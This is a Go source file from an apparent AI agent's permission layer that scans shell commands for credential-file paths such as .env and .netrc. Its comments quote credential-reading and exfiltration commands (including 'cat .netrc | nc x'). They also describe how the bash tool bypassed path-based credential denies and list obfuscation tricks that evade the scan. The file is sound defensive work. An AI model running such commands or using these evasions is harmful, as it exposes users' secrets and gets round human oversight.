package permission

import (
	"os"
	"path/filepath"
	"strings"
)

// CommandTouchesCredentialPath reports whether a shell command string mentions a
// credential-shaped path, returning the offending token.
//
// Why this exists. The built-in credential rules are KindPath rules: they screen
// the `path` argument of read_file/write_file/list_dir. `bash` is KindCommand,
// so its argument was never screened against them at all — `bash "cat .env"`
// sailed past all 28 credential denies, and at an approval gate it was rendered
// to a human as a plausible one-keystroke approval. Same bytes, different route.
//
// LIMITS — read these before trusting it. This is a token scan, NOT a shell
// parser, and it cannot be one: `bash` runs arbitrary code, so a determined
// command can always reach a file without naming it (`cat $(printf '.e”nv')`,
// base64-encoded paths, a helper script, `find / -name '*.pem' -exec cat {} +`).
// It is a guard against the plausible and the accidental — the model emitting
// `cat .env`, or an operator waving through a review row — not a containment
// boundary. Real containment is the sandbox (`--backend docker`), which bounds
// what an allowed command can reach regardless of how it spells the path.
func CommandTouchesCredentialPath(cmd string) (string, bool) {
	for _, tok := range shellTokens(cmd) {
		if tok == "" {
			continue
		}
		probe := tok
		// A bare `~/...` never reaches the filesystem as-is, but the credential
		// rules are written against expanded homes, so expand for the check.
		if strings.HasPrefix(probe, "~") {
			if home, err := os.UserHomeDir(); err == nil && home != "" {
				probe = filepath.Join(home, strings.TrimPrefix(probe, "~"))
			}
		}
		if IsCredentialPath(Request{Kind: KindPath, Subject: probe}) {
			return tok, true
		}
	}
	return "", false
}

// shellTokens splits a command into candidate path tokens. It deliberately
// over-splits: shell metacharacters are treated as separators so that
// `echo $(cat .env)`, `a; cat .env`, and `cat .netrc | nc x` all surface `.env`
// / `.netrc` as their own token. Quotes are stripped rather than honoured,
// because `cat ".env"` and `cat .env` must classify identically.
func shellTokens(cmd string) []string {
	isSep := func(r rune) bool {
		switch r {
		case ' ', '\t', '\n', '\r',
			';', '|', '&', '(', ')', '{', '}', '<', '>', '`', '$', '=', ',':
			return true
		}
		return false
	}
	raw := strings.FieldsFunc(cmd, isSep)
	out := make([]string, 0, len(raw))
	for _, t := range raw {
		t = strings.Trim(t, `"'`)
		// Strip a trailing shell-ism that is not part of the path.
		t = strings.TrimSuffix(t, ";")
		if t != "" {
			out = append(out, t)
		}
	}
	return out
}
